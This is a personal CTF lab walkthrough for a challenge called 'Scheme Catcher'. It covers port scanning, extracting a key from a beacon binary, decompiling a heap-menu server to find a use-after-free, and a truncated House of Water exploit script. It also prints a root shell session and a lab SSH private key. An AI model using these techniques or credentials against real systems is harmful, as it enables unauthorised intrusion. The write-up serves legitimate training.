@@ -1,0 +1,677 @@
+2026-01-02 23:32:28 EST -- START TIME
+# Scheme Catcher
+--------------------------------------
+
+|================================================================
+- Name: bb21200fff81 
+- IP Address: 10.66.181.190
+- OS: Ubuntu 22.04.5 LTS / x64
+- Notes: 
+
+//CREDS:
+	//beacon.bin
+		Key: EastMass
+
+//Flags:
+	THM{Welcom3_to_th3_eastmass_pwnland}
+	THM{byp4ss_and_pack_is_pwn_you_n33d}
+	THM{theres_someth1g_in_th3_w4t3r_that_cannot_l3ak}
+
+
+|================================================================
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+## Introduction
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+### The Silent Control System of the Jester
+//Once upon a time, before Hopper’s laughter echoed through HopSec Asylum, investigators discovered whispers about a strange server hidden somewhere on his personal systems. No one has actually seen it, no one has managed to access it, and every attempt to break in has failed. The few traces that exist point to a rough and unstable copy of King Malhare’s old command and control setup, rebuilt by Hopper into something twisted and unpredictable. Rumours say the place is scattered with odd folders, stray notes, and several suspicious binaries that seem to pulse with their own rhythm. Hopper is obsessed with building things, changing things, and breaking things just to rebuild them again, and he insists he never commits a single mistake. In his mind, everything he creates is perfect, even if it looks like chaos from the outside.
+
+//Stranger still is how the server behaves when anyone approaches. Connections drop without reason. Tasks appear, vanish, and then reappear elsewhere. Logs rewrite themselves. Some scripts reply to commands with messages that feel a little too aware. Hopper calls the place his masterpiece. He says it’s alive. He says it only listens to him.
+
+//Whether he planned sabotage, rebellion, or something far stranger remains unknown because no analyst has managed to look inside. All that is certain is that Hopper guards this secret with a wild grin and a mind that slips further away each day. The question is now: Can you prove he is wrong, or get lost in his madness?
+
+ip=10.66.181.190
+
+Visit: http://$ip:21337/
+Memory Key: tit_for_tat
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// nmap --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// SCAN
+ip=10.67.177.30
+ports=$(nmap -Pn -p- --min-rate=1000 -T4 $ip | grep '^[0-9]' | cut -d '/' -f 1 | paste -sd ',' -)
+
+echo $ports
+//22,80,9004,21337
+
+2026-01-03 00:05:04 EST -- 
+sudo nmap -Pn -A -p$ports $ip -oN tcp.nmap
+
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 41:00:cb:44:95:4c:79:c1:79:92:6a:13:e8:3a:39:e7 (ECDSA)
+|_  256 fd:ed:68:c9:2d:05:4b:a1:b6:61:fd:a5:f1:7d:65:f2 (ED25519)
+80/tcp    open  http    Apache httpd 2.4.58 ((Ubuntu))
+|_http-server-header: Apache/2.4.58 (Ubuntu)
+|_http-title: Under Construction
+9004/tcp  open  unknown
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, RPCCheck, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+|     Payload Storage Malhare's
+|     Version 4.2.0
+|     >>Invalid option
+|   GenericLines, NULL: 
+|     Payload Storage Malhare's
+|_    Version 4.2.0
+21337/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.12.3)
+|_http-server-header: Werkzeug/3.0.1 Python/3.12.3
+|_http-title: Unlock Hopper's Memories
+
+
+2026-01-03 00:11:18 EST -- 
+# UDP scan
+sudo nmap -Pn -sU --top-ports 100 $ip -oN udp.nmap
+
+PORT     STATE         SERVICE
+68/udp   open|filtered dhcpc
+5353/udp open|filtered zeroconf
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// 80/tcp	http	Apache httpd 2.4.58 ((Ubuntu))
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+//Visit http://10.67.177.30/
+Under Construction
+
+This little Easter burrow is getting ready.
+Check back soon for more bunny business!
+
+2026-01-03 00:11:23 EST -- 
+whatweb -a 3 http://$ip
+
+http://10.67.177.30 [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[10.67.177.30], PoweredBy[carrots], Title[Under Construction]
+
+
+-- feroxbuster --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+feroxbuster -k -u http://10.67.177.30/ -w /usr/share/dirb/wordlists/big.txt --scan-limit 2 -x php,txt,html,htm,aspx -o feroxbuster_80.out
+
+200  http://10.67.177.30/
+301  http://10.67.177.30/dev => http://10.67.177.30/dev/
+200  http://10.67.177.30/dev/4.2.0.zip
+200  http://10.67.177.30/index.html
+
+//There does not seem to be anything on the web application at port 80. However, fuzzing it for directories, we can quickly discover the /dev endpoint.
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// First Flag
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2026-01-03 00:38:39 EST -- 
+//Download the zip file
+wget http://10.67.177.30/dev/4.2.0.zip
+
+unzip -l 4.2.0.zip
+Archive:  4.2.0.zip
+  Length      Date    Time    Name
+---------  ---------- -----   ----
+        0  2025-12-05 11:13   latest/
+    22823  2025-12-05 11:12   latest/beacon.bin
+---------                     -------
+    22823                     2 files
+
+//Extract and look into this file
+unzip 4.2.0.zip
+
+2026-01-03 00:45:19 EST -- 
+file latest/beacon.bin
+latest/beacon.bin: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6130a2932421dfd5fb7f8034bd8ca749bac01434, for GNU/Linux 3.2.0, not stripped
+
+2026-01-03 00:46:47 EST -- 
+strings latest/beacon.bin | less
+
+//Simply checking the binary with strings, we can discover the first flag.
+
+	//THM{Welcom3_to_th3_eastmass_pwnland}
+
+//Interesting in the same strings output
+GET %s HTTP/1.1
+Host: localhost
+Connection: close
+Failed to send HTTP request
+Command deleted
+Successfully deleted /tmp/b68vC103RH
+Failed to delete /tmp/b68vC103RH
+=== Menu ===
+1. Execute command
+2. Load payload
+3. Delete command
+4. Exit
+Choose an option: 
+Enter key: 
+Hello %s!
+socket failed
+setsockopt
+bind failed
+listen
+Socket server listening on port 4444...
+accept
+Received command: %s
+Exit command received
+Invalid command: %s
+EastMass
+Access denied.
+Access granted! Starting socket server...
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// Second Flag
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+//Apart from the flag in the strings output, we see a couple more interesting things: the template for an HTTP request, a menu, and what looks like a key: EastMass.
+
+./latest/beacon.bin 
+Enter key: EastMass
+Hello EastMass!
+Access granted! Starting socket server...
+Socket server listening on port 4444...
+
+//Check listeners on localbox
+ss -4antl            
+State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    
+LISTEN    0         3                  0.0.0.0:4444             0.0.0.0:*
+
+=== Menu ===
+1. Execute command
+2. Load payload
+3. Delete command
+4. Exit
+
+Connecting to it and sending 1 for the Execute command option:
+
+2026-01-03 01:08:28 EST -- 
+### Connecting to local port and selecting 1(Execute command):
+rlwrap -cAr nc -nv 127.0.0.1 4444
+(UNKNOWN) [127.0.0.1] 4444 (?) open
+1
+
+Received command: 1
+
+Command executed
+sh: 1: /tmp/b68vC103RH: not found
+Command exited with status: 127
+
+//Looking back at the server, we see it complaining that /tmp/b68vC103RH is not found to delete.
+Successfully deleted /tmp/b68vC103RH
+Failed to delete /tmp/b68vC103RH
+
+### Connecting to local port and selecting 2(Load Payload):
+rlwrap -cAr nc -nv 127.0.0.1 4444
+(UNKNOWN) [127.0.0.1] 4444 (?) open
+2
+
+Received command: 2
+
+Payload loaded
+Connection failed: Connection refused
+
+### Connecting to local port and selecting 3(Delete command):
+rlwrap -cAr nc -nv 127.0.0.1 4444
+(UNKNOWN) [127.0.0.1] 4444 (?) open
+3
+
+Received command: 3
+
+Command deleted
+Failed to delete /tmp/b68vC103RH: No such file or directory
+
+### Connecting to local port and selecting 4(Exit):
+rlwrap -cAr nc -nv 127.0.0.1 4444
+(UNKNOWN) [127.0.0.1] 4444 (?) open
+4
+
+Received command: 4
+
+Exit command received
+
+
+//Running Wireshark to capture the network traffic, then connecting back and sending 2 again, we can see the server attempting to connect to port 80 on localhost.
+
+//Starting a listener on port 80 and sending 2 again, we can see that the binary makes a GET request to the /7ln6Z1X9EF endpoint.
+
+//Start a local listener on port 80
+nc -lvnp 80
+
+//Start Binary
+./latest/beacon.bin
+Enter key: EastMass
+Hello EastMass!
+Access granted! Starting socket server...
+Socket server listening on port 4444...
+
+//Call Binary
+rlwrap -cAr nc -nv 127.0.0.1 4444
+(UNKNOWN) [127.0.0.1] 4444 (?) open
+2
+
+//Result
+nc -lvnp 80
+listening on [any] 80 ...
+connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 52726
+GET /7ln6Z1X9EF HTTP/1.1
+Host: localhost
+Connection: close
+
+//Visit Page
+http://10.67.177.30/7ln6Z1X9EF/
+
+//Files on page
+	4.2.0-R1-1337-server.zip
+	foothold.txt
+
+//Pull Files
+wget http://10.67.177.30/7ln6Z1X9EF/4.2.0-R1-1337-server.zip
+
+unzip -l 4.2.0-R1-1337-server.zip
+Archive:  4.2.0-R1-1337-server.zip
+  Length      Date    Time    Name
+---------  ---------- -----   ----
+   822280  2025-12-02 02:09   ld-linux-x86-64.so.2
+  6342160  2025-12-02 02:10   libc.so.6
+    24601  2025-12-02 02:10   server
+
+wget http://10.67.177.30/7ln6Z1X9EF/foothold.txt
+cat foothold.txt 
+	//THM{byp4ss_and_pack_is_pwn_you_n33d}
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// Third Flag
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+//Apart from the flag, we also have the 4.2.0-R1-1337-server.zip archive. Downloading and extracting it, we get a binary along with the libc it uses.
+
+unzip -l 4.2.0-R1-1337-server.zip
+Archive:  4.2.0-R1-1337-server.zip
+  Length      Date    Time    Name
+---------  ---------- -----   ----
+   822280  2025-12-02 02:09   ld-linux-x86-64.so.2
+  6342160  2025-12-02 02:10   libc.so.6
+    24601  2025-12-02 02:10   server
+
+2026-01-03 02:26:56 EST -- 
+unzip 4.2.0-R1-1337-server.zip
+
+file server
+
+server: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-linux-x86-64.so.2, BuildID[sha1]=ff55e2dc0beef545cb9d178d953e93e0f359b721, for GNU/Linux 3.2.0, not stripped
+
+## Breakdown of the Binary
+ELF 64-bit			It’s a 64-bit Linux binary
+LSB					Little-endian
+PIE executable		Position-Independent Executable → means ASLR applies to code, not just data
+x86-64				Architecture is 64-bit Intel/AMD
+Dynamically linked	Uses shared libraries like libc.so
+Not stripped		Function names and symbols are still present — helpful in Ghidra!
+
+## What This Means for Exploitation
+PIE is enabled
+
+All function addresses and global variables will be randomized every time the program is run.
+You cannot hardcode addresses in your exploit
+You will need an info leak, or use a brute-force leakless technique if that’s not possible.
+
+
+//Install Ghidra
+sudo apt install ghidra
+
+## Ghidra
+Since it’s not stripped, open the binary in Ghidra:
+	1.Launch Ghidra
+	2.Create a project → import the /home/kali/haxterm/data/SideQuest2/server binary
+	3. 
+
+When analyzing, make sure "Process symbol information" is checked (since it’s not stripped)
+
+
+//Opening the binary in ghidra and looking at the menu function, it appears to match the application running on port 9004 on the target.
+
+void menu(void)
+
+{
+  puts("[1] C:");
+  puts("[2] U:");
+  puts("[3] D:");
+  printf("[4] E:\n>>");
+  return;
+}
+
+//Checking the main function, we can see it calling the delete, create, or update functions depending on the option read from the user.
+
+// main()
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+undefined8 main(void)
+
+{
+  int iVar1;
+  
+  setup();
+  banner();
+LAB_001015f7:
+  menu();
+  iVar1 = read_opt();
+  if (iVar1 == 4) {
+    puts("Bye");
+                    /* WARNING: Subroutine does not return */
+    _exit(0x539);
+  }
+  if (iVar1 < 5) {
+    if (iVar1 == 3) {
+//      delete();
+      goto LAB_001015f7;
+    }
+    if (iVar1 < 4) {
+      if (iVar1 == 1) {
+//        create();
+      }
+      else {
+        if (iVar1 != 2) goto LAB_00101671;
+//        update();
+      }
+      goto LAB_001015f7;
+    }
+  }
+LAB_00101671:
+  puts("Invalid option");
+  return 0;
+}
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+//Inspecting the create function, we can see that it simply prompts the user for a size, allocates memory using malloc with that size, stores the resulting pointer in the chunks array, and records the size in the sizes array.
+
+// create()
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+undefined8 create(void)
+
+{
+  long lVar1;
+  ulong uVar2;
+  int iVar3;
+  undefined8 uVar4;
+  size_t __size;
+  void *pvVar5;
+  
+  if (idx < 0x100) {
+    puts("size: ");
+    iVar3 = read_opt();
+    uVar2 = idx;
+    __size = (size_t)iVar3;
+    if (__size == 0) {
+      puts("Size should be non-zero!");
+      uVar4 = 1;
+    }
+    else {
+      pvVar5 = malloc(__size);
+      *(void **)(chunks + uVar2 * 8) = pvVar5;
+      lVar1 = idx * 8;
+      idx = idx + 1;
+      *(size_t *)(sizes + lVar1) = __size;
+      uVar4 = 0;
+    }
+  }
+  else {
+    puts("You cannot allocate any more!");
+    uVar4 = 1;
+  }
+  return uVar4;
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+//Looking at the update function, we can see that it reads an index from the user, checks that it is in bounds and that memory is allocated for that index, then reads an offset and data and writes the data read to that offset in the allocated chunk.
+
+// update()
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+undefined8 update(void)
+
+{
+  uint uVar1;
+  uint uVar2;
+  undefined8 uVar3;
+  
+  puts("idx:");
+  uVar1 = read_opt();
+  if ((uVar1 < 0xf9) && (*(long *)(chunks + (ulong)uVar1 * 8) != 0)) {
+    puts("offset:");
+    uVar2 = read_opt();
+    if ((ulong)uVar2 < *(ulong *)(sizes + (ulong)uVar1 * 8)) {
+      puts("data:");
+      read(0,(void *)((ulong)uVar2 + *(long *)(chunks + (ulong)uVar1 * 8)),
+           *(long *)(sizes + (ulong)uVar1 * 8) - (ulong)uVar2);
+      uVar3 = 0;
+    }
+    else {
+      puts("Offset too large!");
+      uVar3 = 1;
+    }
+  }
+  else {
+    puts("Invalid idx");
+    uVar3 = 0xffffffff;
+  }
+  return uVar3;
+}
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+//Lastly, checking the delete function, we see that it reads an index from the user and, if valid, calls free on the corresponding chunk. However, the function does not clear the address from the chunks array, which creates a Use-After-Free vulnerability, as the freed pointer remains accessible and can still be modified via the update function.
+
+// delete()
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+undefined8 delete(void)
+
+{
+  uint uVar1;
+  undefined8 uVar2;
+  
+  puts("idx:");
+  uVar1 = read_opt();
+  if ((uVar1 < 0xf9) && (*(long *)(chunks + (ulong)uVar1 * 8) != 0)) {
+    free(*(void **)(chunks + (ulong)uVar1 * 8));
+    puts("deleted successfully");
+    uVar2 = 0;
+  }
+  else {
+    puts("Invalid idx");
+    uVar2 = 0xffffffff;
+  }
+  return uVar2;
+}
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+//Usually, in heap exploitation challenges, we would also have a read primitive allowing us to leak addresses from freed memory, which we could then use with various methods like tcache poisoning to achieve remote code execution. However, examining the binary, we can see that we do not have such a primitive. Instead, we can use the leakless House of Water technique.
+
+## Leakless Heap Exploitation - The House of Water
+https://corgi.rip/posts/leakless_heap_1/
+
+
+[1] C: → create()   → malloc a chunk
+[2] U: → update()   → write to a chunk
+[3] D: → delete()   → free a chunk (but doesn’t clear it → UAF)
+[4] E: → exit()     → quits the program
+
+
+// House of Water PoC
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+git clone https://github.com/corgeman/leakless_research.git
+
+cd leakless_research/part_1
+
+//Download python virtual env
+sudo apt install python3-venv
+
+//Create virtual env
+python3 -m venv SideQuest2
+
+# Activate the environment
+source SideQuest2/bin/activate
+
+//Needs pwntools library
+pip install pwn
+
+//Location
+/home/kali/haxterm/data/SideQuest2/leakless_research/part_1
+
+//For the RCE portion of the exploit, we also need the io_file.py file from the same repository.
+
+//Now, with everything in place, we can run the exploit and see that we successfully obtain a shell inside a Docker container and can read the third flag inside user.txt.
+
+//For the RCE portion of the exploit, we also need the io_file.py file from the same repository.
+
+// *Exploit* (solve.py)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+#!/usr/bin/env python3
+
+from pwn import *
+import io_file
+
+context.update(arch="amd64", os="linux", log_level="error")
+context.binary = elf = ELF("/home/kali/haxterm/data/SideQuest2/server", checksec=False)
+libc = ELF("/home/kali/haxterm/data/SideQuest2/libc.so.6", checksec=False)
+
+exit_addr = libc.sym['exit']
+stdout_addr = libc.sym['_IO_2_1_stdout_']
+
+for heap_brute in range(16):
+    for libc_brute in range(16):
+        try:
+            print(f"Trying heap_brute={heap_brute:#x}, libc_brute={libc_brute:#x}")
+
+            r = remote("10.66.181.190", 9004)
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// Fourth Flag
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2026-01-03 06:33:11 EST -- 
+python3 solve.py 
+
+//Now, with everything in place, we can run the exploit and see that we successfully obtain a shell inside a Docker container and can read the third flag inside user.txt.
+
+
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+cat user.txt
+
+//THM{theres_someth1g_in_th3_w4t3r_that_cannot_l3ak}
+
+cat /etc/*elease
+PRETTY_NAME="Ubuntu 22.04.5 LTS"
+
+uname -a
+Linux bb21200fff81 6.14.0-1017-aws #17~24.04.1-Ubuntu SMP Wed Nov  5 10:48:17 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+
+hostname
+bb21200fff81
+
+cd /home/srv
+
+-rwxrwxrwx 1 root root  411 Dec  2 06:11 id_rsa
+-rwxrwxrwx 1 root root   97 Dec  2 06:11 id_rsa.pub
+-rwxrwxr-x 1 root root 804K Dec  2 02:44 ld-linux-x86-64.so.2
+-rwxrwxr-x 1 root root 6.1M Dec  2 02:44 libc.so.6
+-rwxrwxr-x 1 root root  25K Dec  2 04:30 server
+-rwxrwxr-x 1 root root   51 Dec  2 07:35 user.txt
+
+//cat id_rsa
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACDa1BG0w5HKQLmBltbDeDk3ee2b0sVyFqu5L/V4jlSrPQAAAJib4ojYm+KI
+2AAAAAtzc2gtZWQyNTUxOQAAACDa1BG0w5HKQLmBltbDeDk3ee2b0sVyFqu5L/V4jlSrPQ
+AAAECuFWeJq3xX3/SaKB3EPHBPWUCB46sAj6ewL623eVpaMNrUEbTDkcpAuYGW1sN4OTd5
+7ZvSxXIWq7kv9XiOVKs9AAAAD2FnZW50QHRyeWhhY2ttZQECAwQFBg==
+-----END OPENSSH PRIVATE KEY-----
+
+cat id_rsa.pub 
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINrUEbTDkcpAuYGW1sN4OTd57ZvSxXIWq7kv9XiOVKs9 agent@tryhackme
+
+//Lets login with these creds
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i id_rsa agent@$ip
+Warning: Permanently added '10.66.181.190' (ED25519) to the list of known hosts.
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+Permissions 0664 for 'id_rsa' are too open.
+It is required that your private key files are NOT accessible by others.
+This private key will be ignored.
+Load key "id_rsa": bad permissions
+agent@10.66.181.190: Permission denied (publickey).
+
+
+chmod 600 id_rsa
+
+//SUCCESS login
+
+egrep '/bin/(bash|sh|zsh)$' /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+agent:x:1001:1001:,,,:/home/agent:/bin/bash
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+
+
+// 9004/tcp	unknown 
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+//Try a nc connection
+nc -nv $ip 9004
+
+(UNKNOWN) [10.67.177.30] 9004 (?) open
+Payload Storage Malhare's
+Version 4.2.0
+[1] C:
+[2] U:
+[3] D:
+[4] E:
+>>
+
+//Checking the service on port 9004, we get a menu with a couple of options but nothing clear on what can be done.
+
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+
